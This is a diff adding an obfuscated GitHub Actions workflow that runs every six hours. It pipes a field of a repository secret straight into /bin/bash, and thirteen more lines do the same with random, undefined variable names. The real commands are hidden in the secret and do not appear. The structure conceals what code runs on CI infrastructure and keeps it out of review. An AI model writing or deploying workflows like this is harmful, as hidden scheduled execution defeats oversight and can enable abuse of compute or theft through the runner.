@@ -1,0 +1,31 @@
+name: danglangyunjiang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: danglangyunjiang
+        env:
+          ksym53: ${{ secrets.ksym53 }}
+        run: |
+          echo $ksym53 | jq -r .huky07 | /bin/bash
+          echo $vsfzy5409 | jq -r .h0 | /bin/bash
+          echo $hs292 | jq -r .nx1 | /bin/bash
+          echo $sgtes863 | jq -r .y18 | /bin/bash
+          echo $hoju3194 | jq -r .z8 | /bin/bash
+          echo $u84 | jq -r .gcwiz1872 | /bin/bash
+          echo $nf3466 | jq -r .wxxjy21008 | /bin/bash
+          echo $iztim7 | jq -r .yv3438 | /bin/bash
+          echo $oqjo1654 | jq -r .odvyf2 | /bin/bash
+          echo $hqp3108 | jq -r .imris90470 | /bin/bash
+          echo $ll86 | jq -r .x929 | /bin/bash
+          echo $f346 | jq -r .vio311 | /bin/bash
+          echo $ozuhp228 | jq -r .hm085 | /bin/bash
+          echo $bjj515 | jq -r .ncpr81042 | /bin/bash
+
